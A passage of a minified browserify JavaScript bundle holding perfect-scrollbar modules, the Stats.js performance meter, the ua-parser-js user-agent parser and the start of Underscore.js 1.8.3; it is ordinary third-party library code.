},{"../../lib/helper":28,"../instances":40,"../update-geometry":41}],38:[function(require,module,exports){
"use strict";function bindTouchHandler(e,n,t,o){function i(t,o){var i=e.scrollTop,r=e.scrollLeft,a=Math.abs(t),p=Math.abs(o);if(p>a){if(0>o&&i===n.contentHeight-n.containerHeight||o>0&&0===i)return!n.settings.swipePropagation}else if(a>p&&(0>t&&r===n.contentWidth-n.containerWidth||t>0&&0===r))return!n.settings.swipePropagation;return!0}function r(n,t){e.scrollTop=e.scrollTop-t,e.scrollLeft=e.scrollLeft-n,updateGeometry(e)}function a(){f=!0}function p(){f=!1}function c(e){return e.targetTouches?e.targetTouches[0]:e}function u(e){return e.targetTouches&&1===e.targetTouches.length?!0:e.pointerType&&"mouse"!==e.pointerType&&e.pointerType!==e.MSPOINTER_TYPE_MOUSE?!0:!1}function d(e){if(u(e)){h=!0;var n=c(e);l.pageX=n.pageX,l.pageY=n.pageY,g=(new Date).getTime(),null!==b&&clearInterval(b),e.stopPropagation()}}function s(e){if(!f&&h&&u(e)){var n=c(e),t={pageX:n.pageX,pageY:n.pageY},o=t.pageX-l.pageX,a=t.pageY-l.pageY;r(o,a),l=t;var p=(new Date).getTime(),d=p-g;d>0&&(w.x=o/d,w.y=a/d,g=p),i(o,a)&&(e.stopPropagation(),e.preventDefault())}}function v(){!f&&h&&(h=!1,clearInterval(b),b=setInterval(function(){return instances.get(e)?Math.abs(w.x)<.01&&Math.abs(w.y)<.01?void clearInterval(b):(r(30*w.x,30*w.y),w.x*=.8,void(w.y*=.8)):void clearInterval(b)},10))}var l={},g=0,w={},b=null,f=!1,h=!1;t&&(n.event.bind(window,"touchstart",a),n.event.bind(window,"touchend",p),n.event.bind(e,"touchstart",d),n.event.bind(e,"touchmove",s),n.event.bind(e,"touchend",v)),o&&(window.PointerEvent?(n.event.bind(window,"pointerdown",a),n.event.bind(window,"pointerup",p),n.event.bind(e,"pointerdown",d),n.event.bind(e,"pointermove",s),n.event.bind(e,"pointerup",v)):window.MSPointerEvent&&(n.event.bind(window,"MSPointerDown",a),n.event.bind(window,"MSPointerUp",p),n.event.bind(e,"MSPointerDown",d),n.event.bind(e,"MSPointerMove",s),n.event.bind(e,"MSPointerUp",v)))}var instances=require("../instances"),updateGeometry=require("../update-geometry");module.exports=function(e,n,t){var o=instances.get(e);bindTouchHandler(e,o,n,t)};
},{"../instances":40,"../update-geometry":41}],39:[function(require,module,exports){
"use strict";var cls=require("../lib/class"),h=require("../lib/helper"),instances=require("./instances"),updateGeometry=require("./update-geometry"),clickRailHandler=require("./handler/click-rail"),dragScrollbarHandler=require("./handler/drag-scrollbar"),keyboardHandler=require("./handler/keyboard"),mouseWheelHandler=require("./handler/mouse-wheel"),nativeScrollHandler=require("./handler/native-scroll"),selectionHandler=require("./handler/selection"),touchHandler=require("./handler/touch");module.exports=function(e,r){r="object"==typeof r?r:{},cls.add(e,"ps-container");var l=instances.add(e);l.settings=h.extend(l.settings,r),clickRailHandler(e),dragScrollbarHandler(e),mouseWheelHandler(e),nativeScrollHandler(e),selectionHandler(e),(h.env.supportsTouch||h.env.supportsIePointer)&&touchHandler(e,h.env.supportsTouch,h.env.supportsIePointer),l.settings.useKeyboard&&keyboardHandler(e),updateGeometry(e)};
},{"../lib/class":24,"../lib/helper":28,"./handler/click-rail":32,"./handler/drag-scrollbar":33,"./handler/keyboard":34,"./handler/mouse-wheel":35,"./handler/native-scroll":36,"./handler/selection":37,"./handler/touch":38,"./instances":40,"./update-geometry":41}],40:[function(require,module,exports){
"use strict";function Instance(l){var t=this;t.settings=h.clone(defaultSettings),t.containerWidth=null,t.containerHeight=null,t.contentWidth=null,t.contentHeight=null,t.isRtl="rtl"===d.css(l,"direction"),t.isNegativeScroll=function(){var t=l.scrollLeft,r=null;return l.scrollLeft=-1,r=l.scrollLeft<0,l.scrollLeft=t,r}(),t.negativeScrollAdjustment=t.isNegativeScroll?l.scrollWidth-l.clientWidth:0,t.event=new EventManager,t.ownerDocument=l.ownerDocument||document,t.scrollbarXRail=d.appendTo(d.e("div","ps-scrollbar-x-rail"),l),t.scrollbarX=d.appendTo(d.e("div","ps-scrollbar-x"),t.scrollbarXRail),t.scrollbarXActive=null,t.scrollbarXWidth=null,t.scrollbarXLeft=null,t.scrollbarXBottom=h.toInt(d.css(t.scrollbarXRail,"bottom")),t.isScrollbarXUsingBottom=t.scrollbarXBottom===t.scrollbarXBottom,t.scrollbarXTop=t.isScrollbarXUsingBottom?null:h.toInt(d.css(t.scrollbarXRail,"top")),t.railBorderXWidth=h.toInt(d.css(t.scrollbarXRail,"borderLeftWidth"))+h.toInt(d.css(t.scrollbarXRail,"borderRightWidth")),d.css(t.scrollbarXRail,"display","block"),t.railXMarginWidth=h.toInt(d.css(t.scrollbarXRail,"marginLeft"))+h.toInt(d.css(t.scrollbarXRail,"marginRight")),d.css(t.scrollbarXRail,"display",""),t.railXWidth=null,t.railXRatio=null,t.scrollbarYRail=d.appendTo(d.e("div","ps-scrollbar-y-rail"),l),t.scrollbarY=d.appendTo(d.e("div","ps-scrollbar-y"),t.scrollbarYRail),t.scrollbarYActive=null,t.scrollbarYHeight=null,t.scrollbarYTop=null,t.scrollbarYRight=h.toInt(d.css(t.scrollbarYRail,"right")),t.isScrollbarYUsingRight=t.scrollbarYRight===t.scrollbarYRight,t.scrollbarYLeft=t.isScrollbarYUsingRight?null:h.toInt(d.css(t.scrollbarYRail,"left")),t.scrollbarYOuterWidth=t.isRtl?h.outerWidth(t.scrollbarY):null,t.railBorderYWidth=h.toInt(d.css(t.scrollbarYRail,"borderTopWidth"))+h.toInt(d.css(t.scrollbarYRail,"borderBottomWidth")),d.css(t.scrollbarYRail,"display","block"),t.railYMarginHeight=h.toInt(d.css(t.scrollbarYRail,"marginTop"))+h.toInt(d.css(t.scrollbarYRail,"marginBottom")),d.css(t.scrollbarYRail,"display",""),t.railYHeight=null,t.railYRatio=null}function getId(l){return"undefined"==typeof l.dataset?l.getAttribute("data-ps-id"):l.dataset.psId}function setId(l,t){"undefined"==typeof l.dataset?l.setAttribute("data-ps-id",t):l.dataset.psId=t}function removeId(l){"undefined"==typeof l.dataset?l.removeAttribute("data-ps-id"):delete l.dataset.psId}var d=require("../lib/dom"),defaultSettings=require("./default-setting"),EventManager=require("../lib/event-manager"),guid=require("../lib/guid"),h=require("../lib/helper"),instances={};exports.add=function(l){var t=guid();return setId(l,t),instances[t]=new Instance(l),instances[t]},exports.remove=function(l){delete instances[getId(l)],removeId(l)},exports.get=function(l){return instances[getId(l)]};
},{"../lib/dom":25,"../lib/event-manager":26,"../lib/guid":27,"../lib/helper":28,"./default-setting":30}],41:[function(require,module,exports){
"use strict";function getThumbSize(t,r){return t.settings.minScrollbarLength&&(r=Math.max(r,t.settings.minScrollbarLength)),t.settings.maxScrollbarLength&&(r=Math.min(r,t.settings.maxScrollbarLength)),r}function updateCss(t,r){var l={width:r.railXWidth};r.isRtl?l.left=r.negativeScrollAdjustment+t.scrollLeft+r.containerWidth-r.contentWidth:l.left=t.scrollLeft,r.isScrollbarXUsingBottom?l.bottom=r.scrollbarXBottom-t.scrollTop:l.top=r.scrollbarXTop+t.scrollTop,d.css(r.scrollbarXRail,l);var i={top:t.scrollTop,height:r.railYHeight};r.isScrollbarYUsingRight?r.isRtl?i.right=r.contentWidth-(r.negativeScrollAdjustment+t.scrollLeft)-r.scrollbarYRight-r.scrollbarYOuterWidth:i.right=r.scrollbarYRight-t.scrollLeft:r.isRtl?i.left=r.negativeScrollAdjustment+t.scrollLeft+2*r.containerWidth-r.contentWidth-r.scrollbarYLeft-r.scrollbarYOuterWidth:i.left=r.scrollbarYLeft+t.scrollLeft,d.css(r.scrollbarYRail,i),d.css(r.scrollbarX,{left:r.scrollbarXLeft,width:r.scrollbarXWidth-r.railBorderXWidth}),d.css(r.scrollbarY,{top:r.scrollbarYTop,height:r.scrollbarYHeight-r.railBorderYWidth})}var cls=require("../lib/class"),d=require("../lib/dom"),h=require("../lib/helper"),instances=require("./instances");module.exports=function(t){var r=instances.get(t);r.containerWidth=t.clientWidth,r.containerHeight=t.clientHeight,r.contentWidth=t.scrollWidth,r.contentHeight=t.scrollHeight;var l;t.contains(r.scrollbarXRail)||(l=d.queryChildren(t,".ps-scrollbar-x-rail"),l.length>0&&l.forEach(function(t){d.remove(t)}),d.appendTo(r.scrollbarXRail,t)),t.contains(r.scrollbarYRail)||(l=d.queryChildren(t,".ps-scrollbar-y-rail"),l.length>0&&l.forEach(function(t){d.remove(t)}),d.appendTo(r.scrollbarYRail,t)),!r.settings.suppressScrollX&&r.containerWidth+r.settings.scrollXMarginOffset<r.contentWidth?(r.scrollbarXActive=!0,r.railXWidth=r.containerWidth-r.railXMarginWidth,r.railXRatio=r.containerWidth/r.railXWidth,r.scrollbarXWidth=getThumbSize(r,h.toInt(r.railXWidth*r.containerWidth/r.contentWidth)),r.scrollbarXLeft=h.toInt((r.negativeScrollAdjustment+t.scrollLeft)*(r.railXWidth-r.scrollbarXWidth)/(r.contentWidth-r.containerWidth))):(r.scrollbarXActive=!1,r.scrollbarXWidth=0,r.scrollbarXLeft=0,t.scrollLeft=0),!r.settings.suppressScrollY&&r.containerHeight+r.settings.scrollYMarginOffset<r.contentHeight?(r.scrollbarYActive=!0,r.railYHeight=r.containerHeight-r.railYMarginHeight,r.railYRatio=r.containerHeight/r.railYHeight,r.scrollbarYHeight=getThumbSize(r,h.toInt(r.railYHeight*r.containerHeight/r.contentHeight)),r.scrollbarYTop=h.toInt(t.scrollTop*(r.railYHeight-r.scrollbarYHeight)/(r.contentHeight-r.containerHeight))):(r.scrollbarYActive=!1,r.scrollbarYHeight=0,r.scrollbarYTop=0,t.scrollTop=0),r.scrollbarXLeft>=r.railXWidth-r.scrollbarXWidth&&(r.scrollbarXLeft=r.railXWidth-r.scrollbarXWidth),r.scrollbarYTop>=r.railYHeight-r.scrollbarYHeight&&(r.scrollbarYTop=r.railYHeight-r.scrollbarYHeight),updateCss(t,r),cls[r.scrollbarXActive?"add":"remove"](t,"ps-active-x"),cls[r.scrollbarYActive?"add":"remove"](t,"ps-active-y")};
},{"../lib/class":24,"../lib/dom":25,"../lib/helper":28,"./instances":40}],42:[function(require,module,exports){
"use strict";var d=require("../lib/dom"),h=require("../lib/helper"),instances=require("./instances"),updateGeometry=require("./update-geometry");module.exports=function(l){var s=instances.get(l);s&&(s.negativeScrollAdjustment=s.isNegativeScroll?l.scrollWidth-l.clientWidth:0,d.css(s.scrollbarXRail,"display","block"),d.css(s.scrollbarYRail,"display","block"),s.railXMarginWidth=h.toInt(d.css(s.scrollbarXRail,"marginLeft"))+h.toInt(d.css(s.scrollbarXRail,"marginRight")),s.railYMarginHeight=h.toInt(d.css(s.scrollbarYRail,"marginTop"))+h.toInt(d.css(s.scrollbarYRail,"marginBottom")),d.css(s.scrollbarXRail,"display","none"),d.css(s.scrollbarYRail,"display","none"),updateGeometry(l),d.css(s.scrollbarXRail,"display",""),d.css(s.scrollbarYRail,"display",""))};
},{"../lib/dom":25,"../lib/helper":28,"./instances":40,"./update-geometry":41}],43:[function(require,module,exports){
var Stats=function(){var e=Date.now(),t=e,n=0,i=1/0,a=0,d=0,l=1/0,o=0,s=0,r=0,p=document.createElement("div");p.id="stats",p.addEventListener("mousedown",function(e){e.preventDefault(),y(++r%2)},!1),p.style.cssText="width:80px;opacity:0.9;cursor:pointer";var c=document.createElement("div");c.id="fps",c.style.cssText="padding:0 0 3px 3px;text-align:left;background-color:#002",p.appendChild(c);var h=document.createElement("div");h.id="fpsText",h.style.cssText="color:#0ff;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px",h.innerHTML="FPS",c.appendChild(h);var f=document.createElement("div");for(f.id="fpsGraph",f.style.cssText="position:relative;width:74px;height:30px;background-color:#0ff",c.appendChild(f);74>f.children.length;){var x=document.createElement("span");x.style.cssText="width:1px;height:30px;float:left;background-color:#113",f.appendChild(x)}var m=document.createElement("div");m.id="ms",m.style.cssText="padding:0 0 3px 3px;text-align:left;background-color:#020;display:none",p.appendChild(m);var u=document.createElement("div");u.id="msText",u.style.cssText="color:#0f0;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px",u.innerHTML="MS",m.appendChild(u);var v=document.createElement("div");for(v.id="msGraph",v.style.cssText="position:relative;width:74px;height:30px;background-color:#0f0",m.appendChild(v);74>v.children.length;)x=document.createElement("span"),x.style.cssText="width:1px;height:30px;float:left;background-color:#131",v.appendChild(x);var y=function(e){switch(r=e){case 0:c.style.display="block",m.style.display="none";break;case 1:c.style.display="none",m.style.display="block"}};return{REVISION:12,domElement:p,setMode:y,begin:function(){e=Date.now()},end:function(){var r=Date.now();n=r-e,i=Math.min(i,n),a=Math.max(a,n),u.textContent=n+" MS ("+i+"-"+a+")";var p=Math.min(30,30-30*(n/200));return v.appendChild(v.firstChild).style.height=p+"px",s++,r>t+1e3&&(d=Math.round(1e3*s/(r-t)),l=Math.min(l,d),o=Math.max(o,d),h.textContent=d+" FPS ("+l+"-"+o+")",p=Math.min(30,30-30*(d/100)),f.appendChild(f.firstChild).style.height=p+"px",t=r,s=0),r},update:function(){e=this.end()}}};"object"==typeof module&&(module.exports=Stats);
},{}],44:[function(require,module,exports){
!function(i,e){"use strict";var s="0.7.9",o="",r="?",n="function",a="undefined",t="object",w="string",l="major",d="model",p="name",c="type",u="vendor",m="version",f="architecture",g="console",b="mobile",h="tablet",v="smarttv",x="wearable",k="embedded",y={extend:function(i,e){for(var s in e)-1!=="browser cpu device engine os".indexOf(s)&&e[s].length%2===0&&(i[s]=e[s].concat(i[s]));return i},has:function(i,e){return"string"==typeof i?-1!==e.toLowerCase().indexOf(i.toLowerCase()):!1},lowerize:function(i){return i.toLowerCase()},major:function(i){return typeof i===w?i.split(".")[0]:e}},A={rgx:function(){for(var i,s,o,r,w,l,d,p=0,c=arguments;p<c.length&&!l;){var u=c[p],m=c[p+1];if(typeof i===a){i={};for(r in m)w=m[r],typeof w===t?i[w[0]]=e:i[w]=e}for(s=o=0;s<u.length&&!l;)if(l=u[s++].exec(this.getUA()))for(r=0;r<m.length;r++)d=l[++o],w=m[r],typeof w===t&&w.length>0?2==w.length?typeof w[1]==n?i[w[0]]=w[1].call(this,d):i[w[0]]=w[1]:3==w.length?typeof w[1]!==n||w[1].exec&&w[1].test?i[w[0]]=d?d.replace(w[1],w[2]):e:i[w[0]]=d?w[1].call(this,d,w[2]):e:4==w.length&&(i[w[0]]=d?w[3].call(this,d.replace(w[1],w[2])):e):i[w]=d?d:e;p+=2}return i},str:function(i,s){for(var o in s)if(typeof s[o]===t&&s[o].length>0){for(var n=0;n<s[o].length;n++)if(y.has(s[o][n],i))return o===r?e:o}else if(y.has(s[o],i))return o===r?e:o;return i}},E={browser:{oldsafari:{version:{"1.0":"/8",1.2:"/1",1.3:"/3","2.0":"/412","2.0.2":"/416","2.0.3":"/417","2.0.4":"/419","?":"/"}}},device:{amazon:{model:{"Fire Phone":["SD","KF"]}},sprint:{model:{"Evo Shift 4G":"7373KT"},vendor:{HTC:"APA",Sprint:"Sprint"}}},os:{windows:{version:{ME:"4.90","NT 3.11":"NT3.51","NT 4.0":"NT4.0",2000:"NT 5.0",XP:["NT 5.1","NT 5.2"],Vista:"NT 6.0",7:"NT 6.1",8:"NT 6.2",8.1:"NT 6.3",10:["NT 6.4","NT 10.0"],RT:"ARM"}}}},S={browser:[[/(opera\smini)\/([\w\.-]+)/i,/(opera\s[mobiletab]+).+version\/([\w\.-]+)/i,/(opera).+version\/([\w\.]+)/i,/(opera)[\/\s]+([\w\.]+)/i],[p,m],[/\s(opr)\/([\w\.]+)/i],[[p,"Opera"],m],[/(kindle)\/([\w\.]+)/i,/(lunascape|maxthon|netfront|jasmine|blazer)[\/\s]?([\w\.]+)*/i,/(avant\s|iemobile|slim|baidu)(?:browser)?[\/\s]?([\w\.]*)/i,/(?:ms|\()(ie)\s([\w\.]+)/i,/(rekonq)\/([\w\.]+)*/i,/(chromium|flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron|vivaldi|iridium)\/([\w\.-]+)/i],[p,m],[/(trident).+rv[:\s]([\w\.]+).+like\sgecko/i],[[p,"IE"],m],[/(edge)\/((\d+)?[\w\.]+)/i],[p,m],[/(yabrowser)\/([\w\.]+)/i],[[p,"Yandex"],m],[/(comodo_dragon)\/([\w\.]+)/i],[[p,/_/g," "],m],[/(chrome|omniweb|arora|[tizenoka]{5}\s?browser)\/v?([\w\.]+)/i,/(uc\s?browser|qqbrowser)[\/\s]?([\w\.]+)/i],[p,m],[/(dolfin)\/([\w\.]+)/i],[[p,"Dolphin"],m],[/((?:android.+)crmo|crios)\/([\w\.]+)/i],[[p,"Chrome"],m],[/XiaoMi\/MiuiBrowser\/([\w\.]+)/i],[m,[p,"MIUI Browser"]],[/android.+version\/([\w\.]+)\s+(?:mobile\s?safari|safari)/i],[m,[p,"Android Browser"]],[/FBAV\/([\w\.]+);/i],[m,[p,"Facebook"]],[/version\/([\w\.]+).+?mobile\/\w+\s(safari)/i],[m,[p,"Mobile Safari"]],[/version\/([\w\.]+).+?(mobile\s?safari|safari)/i],[m,p],[/webkit.+?(mobile\s?safari|safari)(\/[\w\.]+)/i],[p,[m,A.str,E.browser.oldsafari.version]],[/(konqueror)\/([\w\.]+)/i,/(webkit|khtml)\/([\w\.]+)/i],[p,m],[/(navigator|netscape)\/([\w\.-]+)/i],[[p,"Netscape"],m],[/fxios\/([\w\.-]+)/i],[m,[p,"Firefox"]],[/(swiftfox)/i,/(icedragon|iceweasel|camino|chimera|fennec|maemo\sbrowser|minimo|conkeror)[\/\s]?([\w\.\+]+)/i,/(firefox|seamonkey|k-meleon|icecat|iceape|firebird|phoenix)\/([\w\.-]+)/i,/(mozilla)\/([\w\.]+).+rv\:.+gecko\/\d+/i,/(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf)[\/\s]?([\w\.]+)/i,/(links)\s\(([\w\.]+)/i,/(gobrowser)\/?([\w\.]+)*/i,/(ice\s?browser)\/v?([\w\._]+)/i,/(mosaic)[\/\s]([\w\.]+)/i],[p,m]],cpu:[[/(?:(amd|x(?:(?:86|64)[_-])?|wow|win)64)[;\)]/i],[[f,"amd64"]],[/(ia32(?=;))/i],[[f,y.lowerize]],[/((?:i[346]|x)86)[;\)]/i],[[f,"ia32"]],[/windows\s(ce|mobile);\sppc;/i],[[f,"arm"]],[/((?:ppc|powerpc)(?:64)?)(?:\smac|;|\))/i],[[f,/ower/,"",y.lowerize]],[/(sun4\w)[;\)]/i],[[f,"sparc"]],[/((?:avr32|ia64(?=;))|68k(?=\))|arm(?:64|(?=v\d+;))|(?=atmel\s)avr|(?:irix|mips|sparc)(?:64)?(?=;)|pa-risc)/i],[[f,y.lowerize]]],device:[[/\((ipad|playbook);[\w\s\);-]+(rim|apple)/i],[d,u,[c,h]],[/applecoremedia\/[\w\.]+ \((ipad)/],[d,[u,"Apple"],[c,h]],[/(apple\s{0,1}tv)/i],[[d,"Apple TV"],[u,"Apple"]],[/(archos)\s(gamepad2?)/i,/(hp).+(touchpad)/i,/(kindle)\/([\w\.]+)/i,/\s(nook)[\w\s]+build\/(\w+)/i,/(dell)\s(strea[kpr\s\d]*[\dko])/i],[u,d,[c,h]],[/(kf[A-z]+)\sbuild\/[\w\.]+.*silk\//i],[d,[u,"Amazon"],[c,h]],[/(sd|kf)[0349hijorstuw]+\sbuild\/[\w\.]+.*silk\//i],[[d,A.str,E.device.amazon.model],[u,"Amazon"],[c,b]],[/\((ip[honed|\s\w*]+);.+(apple)/i],[d,u,[c,b]],[/\((ip[honed|\s\w*]+);/i],[d,[u,"Apple"],[c,b]],[/(blackberry)[\s-]?(\w+)/i,/(blackberry|benq|palm(?=\-)|sonyericsson|acer|asus|dell|huawei|meizu|motorola|polytron)[\s_-]?([\w-]+)*/i,/(hp)\s([\w\s]+\w)/i,/(asus)-?(\w+)/i],[u,d,[c,b]],[/\(bb10;\s(\w+)/i],[d,[u,"BlackBerry"],[c,b]],[/android.+(transfo[prime\s]{4,10}\s\w+|eeepc|slider\s\w+|nexus 7)/i],[d,[u,"Asus"],[c,h]],[/(sony)\s(tablet\s[ps])\sbuild\//i,/(sony)?(?:sgp.+)\sbuild\//i],[[u,"Sony"],[d,"Xperia Tablet"],[c,h]],[/(?:sony)?(?:(?:(?:c|d)\d{4})|(?:so[-l].+))\sbuild\//i],[[u,"Sony"],[d,"Xperia Phone"],[c,b]],[/\s(ouya)\s/i,/(nintendo)\s([wids3u]+)/i],[u,d,[c,g]],[/android.+;\s(shield)\sbuild/i],[d,[u,"Nvidia"],[c,g]],[/(playstation\s[3portablevi]+)/i],[d,[u,"Sony"],[c,g]],[/(sprint\s(\w+))/i],[[u,A.str,E.device.sprint.vendor],[d,A.str,E.device.sprint.model],[c,b]],[/(lenovo)\s?(S(?:5000|6000)+(?:[-][\w+]))/i],[u,d,[c,h]],[/(htc)[;_\s-]+([\w\s]+(?=\))|\w+)*/i,/(zte)-(\w+)*/i,/(alcatel|geeksphone|huawei|lenovo|nexian|panasonic|(?=;\s)sony)[_\s-]?([\w-]+)*/i],[u,[d,/_/g," "],[c,b]],[/(nexus\s9)/i],[d,[u,"HTC"],[c,h]],[/[\s\(;](xbox(?:\sone)?)[\s\);]/i],[d,[u,"Microsoft"],[c,g]],[/(kin\.[onetw]{3})/i],[[d,/\./g," "],[u,"Microsoft"],[c,b]],[/\s(milestone|droid(?:[2-4x]|\s(?:bionic|x2|pro|razr))?(:?\s4g)?)[\w\s]+build\//i,/mot[\s-]?(\w+)*/i,/(XT\d{3,4}) build\//i],[d,[u,"Motorola"],[c,b]],[/android.+\s(mz60\d|xoom[\s2]{0,2})\sbuild\//i],[d,[u,"Motorola"],[c,h]],[/android.+((sch-i[89]0\d|shw-m380s|gt-p\d{4}|gt-n8000|sgh-t8[56]9|nexus 10))/i,/((SM-T\w+))/i],[[u,"Samsung"],d,[c,h]],[/((s[cgp]h-\w+|gt-\w+|galaxy\snexus|sm-n900))/i,/(sam[sung]*)[\s-]*(\w+-?[\w-]*)*/i,/sec-((sgh\w+))/i],[[u,"Samsung"],d,[c,b]],[/(samsung);smarttv/i],[u,d,[c,v]],[/\(dtv[\);].+(aquos)/i],[d,[u,"Sharp"],[c,v]],[/sie-(\w+)*/i],[d,[u,"Siemens"],[c,b]],[/(maemo|nokia).*(n900|lumia\s\d+)/i,/(nokia)[\s_-]?([\w-]+)*/i],[[u,"Nokia"],d,[c,b]],[/android\s3\.[\s\w;-]{10}(a\d{3})/i],[d,[u,"Acer"],[c,h]],[/android\s3\.[\s\w;-]{10}(lg?)-([06cv9]{3,4})/i],[[u,"LG"],d,[c,h]],[/(lg) netcast\.tv/i],[u,d,[c,v]],[/(nexus\s[45])/i,/lg[e;\s\/-]+(\w+)*/i],[d,[u,"LG"],[c,b]],[/android.+(ideatab[a-z0-9\-\s]+)/i],[d,[u,"Lenovo"],[c,h]],[/linux;.+((jolla));/i],[u,d,[c,b]],[/((pebble))app\/[\d\.]+\s/i],[u,d,[c,x]],[/android.+;\s(glass)\s\d/i],[d,[u,"Google"],[c,x]],[/android.+(\w+)\s+build\/hm\1/i,/android.+(hm[\s\-_]*note?[\s_]*(?:\d\w)?)\s+build/i,/android.+(mi[\s\-_]*(?:one|one[\s_]plus)?[\s_]*(?:\d\w)?)\s+build/i],[[d,/_/g," "],[u,"Xiaomi"],[c,b]],[/(mobile|tablet);.+rv\:.+gecko\//i],[[c,y.lowerize],u,d]],engine:[[/windows.+\sedge\/([\w\.]+)/i],[m,[p,"EdgeHTML"]],[/(presto)\/([\w\.]+)/i,/(webkit|trident|netfront|netsurf|amaya|lynx|w3m)\/([\w\.]+)/i,/(khtml|tasman|links)[\/\s]\(?([\w\.]+)/i,/(icab)[\/\s]([23]\.[\d\.]+)/i],[p,m],[/rv\:([\w\.]+).*(gecko)/i],[m,p]],os:[[/microsoft\s(windows)\s(vista|xp)/i],[p,m],[/(windows)\snt\s6\.2;\s(arm)/i,/(windows\sphone(?:\sos)*|windows\smobile|windows)[\s\/]?([ntce\d\.\s]+\w)/i],[p,[m,A.str,E.os.windows.version]],[/(win(?=3|9|n)|win\s9x\s)([nt\d\.]+)/i],[[p,"Windows"],[m,A.str,E.os.windows.version]],[/\((bb)(10);/i],[[p,"BlackBerry"],m],[/(blackberry)\w*\/?([\w\.]+)*/i,/(tizen)[\/\s]([\w\.]+)/i,/(android|webos|palm\sos|qnx|bada|rim\stablet\sos|meego|contiki)[\/\s-]?([\w\.]+)*/i,/linux;.+(sailfish);/i],[p,m],[/(symbian\s?os|symbos|s60(?=;))[\/\s-]?([\w\.]+)*/i],[[p,"Symbian"],m],[/\((series40);/i],[p],[/mozilla.+\(mobile;.+gecko.+firefox/i],[[p,"Firefox OS"],m],[/(nintendo|playstation)\s([wids3portablevu]+)/i,/(mint)[\/\s\(]?(\w+)*/i,/(mageia|vectorlinux)[;\s]/i,/(joli|[kxln]?ubuntu|debian|[open]*suse|gentoo|arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk|linpus)[\/\s-]?([\w\.-]+)*/i,/(hurd|linux)\s?([\w\.]+)*/i,/(gnu)\s?([\w\.]+)*/i],[p,m],[/(cros)\s[\w]+\s([\w\.]+\w)/i],[[p,"Chromium OS"],m],[/(sunos)\s?([\w\.]+\d)*/i],[[p,"Solaris"],m],[/\s([frentopc-]{0,4}bsd|dragonfly)\s?([\w\.]+)*/i],[p,m],[/(ip[honead]+)(?:.*os\s*([\w]+)*\slike\smac|;\sopera)/i],[[p,"iOS"],[m,/_/g,"."]],[/(mac\sos\sx)\s?([\w\s\.]+\w)*/i,/(macintosh|mac(?=_powerpc)\s)/i],[[p,"Mac OS"],[m,/_/g,"."]],[/((?:open)?solaris)[\/\s-]?([\w\.]+)*/i,/(haiku)\s(\w+)/i,/(aix)\s((\d)(?=\.|\)|\s)[\w\.]*)*/i,/(plan\s9|minix|beos|os\/2|amigaos|morphos|risc\sos|openvms)/i,/(unix)\s?([\w\.]+)*/i],[p,m]]},T=function(e,s){if(!(this instanceof T))return new T(e,s).getResult();var r=e||(i&&i.navigator&&i.navigator.userAgent?i.navigator.userAgent:o),n=s?y.extend(S,s):S;return this.getBrowser=function(){var i=A.rgx.apply(this,n.browser);return i.major=y.major(i.version),i},this.getCPU=function(){return A.rgx.apply(this,n.cpu)},this.getDevice=function(){return A.rgx.apply(this,n.device)},this.getEngine=function(){return A.rgx.apply(this,n.engine)},this.getOS=function(){return A.rgx.apply(this,n.os)},this.getResult=function(){return{ua:this.getUA(),browser:this.getBrowser(),engine:this.getEngine(),os:this.getOS(),device:this.getDevice(),cpu:this.getCPU()}},this.getUA=function(){return r},this.setUA=function(i){return r=i,this},this.setUA(r),this};T.VERSION=s,T.BROWSER={NAME:p,MAJOR:l,VERSION:m},T.CPU={ARCHITECTURE:f},T.DEVICE={MODEL:d,VENDOR:u,TYPE:c,CONSOLE:g,MOBILE:b,SMARTTV:v,TABLET:h,WEARABLE:x,EMBEDDED:k},T.ENGINE={NAME:p,VERSION:m},T.OS={NAME:p,VERSION:m},typeof exports!==a?(typeof module!==a&&module.exports&&(exports=module.exports=T),exports.UAParser=T):typeof define===n&&define.amd?define(function(){return T}):i.UAParser=T;var N=i.jQuery||i.Zepto;if(typeof N!==a){var z=new T;N.ua=z.getResult(),N.ua.get=function(){return z.getUA()},N.ua.set=function(i){z.setUA(i);var e=z.getResult();for(var s in e)N.ua[s]=e[s]}}}("object"==typeof window?window:this);
},{}],45:[function(require,module,exports){
(function(){function n(n){function t(t,r,e,u,i,o){for(;i>=0&&o>i;i+=n){var a=u?u[i]:i;e=r(e,t[a],a,t)}return e}return function(r,e,u,i){e=b(e,i,4);var o=!k(r)&&m.keys(r),a=(o||r).length,c=n>0?0:a-1;return arguments.length<3&&(u=r[o?o[c]:c],c+=n),t(r,e,u,o,c,a)}}function t(n){return function(t,r,e){r=x(r,e);for(var u=O(t),i=n>0?0:u-1;i>=0&&u>i;i+=n)if(r(t[i],i,t))return i;return-1}}function r(n,t,r){return function(e,u,i){var o=0,a=O(e);if("number"==typeof i)n>0?o=i>=0?i:Math.max(i+a,o):a=i>=0?Math.min(i+1,a):i+a+1;else if(r&&i&&a)return i=r(e,u),e[i]===u?i:-1;if(u!==u)return i=t(l.call(e,o,a),m.isNaN),i>=0?i+o:-1;for(i=n>0?o:a-1;i>=0&&a>i;i+=n)if(e[i]===u)return i;return-1}}function e(n,t){var r=I.length,e=n.constructor,u=m.isFunction(e)&&e.prototype||a,i="constructor";for(m.has(n,i)&&!m.contains(t,i)&&t.push(i);r--;)i=I[r],i in n&&n[i]!==u[i]&&!m.contains(t,i)&&t.push(i)}var u=this,i=u._,o=Array.prototype,a=Object.prototype,c=Function.prototype,f=o.push,l=o.slice,s=a.toString,p=a.hasOwnProperty,h=Array.isArray,v=Object.keys,g=c.bind,y=Object.create,d=function(){},m=function(n){return n instanceof m?n:this instanceof m?void(this._wrapped=n):new m(n)};"undefined"!=typeof exports?("undefined"!=typeof module&&module.exports&&(exports=module.exports=m),exports._=m):u._=m,m.VERSION="1.8.3";var b=function(n,t,r){if(void 0===t)return n;switch(null==r?3:r){case 1:return function(r){return n.call(t,r)};case 2:return function(r,e){return n.call(t,r,e)};case 3:return function(r,e,u){return n.call(t,r,e,u)};case 4:return function(r,e,u,i){return n.call(t,r,e,u,i)}}return function(){return n.apply(t,arguments)}},x=function(n,t,r){return null==n?m.identity:m.isFunction(n)?b(n,t,r):m.isObject(n)?m.matcher(n):m.property(n)};m.iteratee=function(n,t){return x(n,t,1/0)};var _=function(n,t){return function(r){var 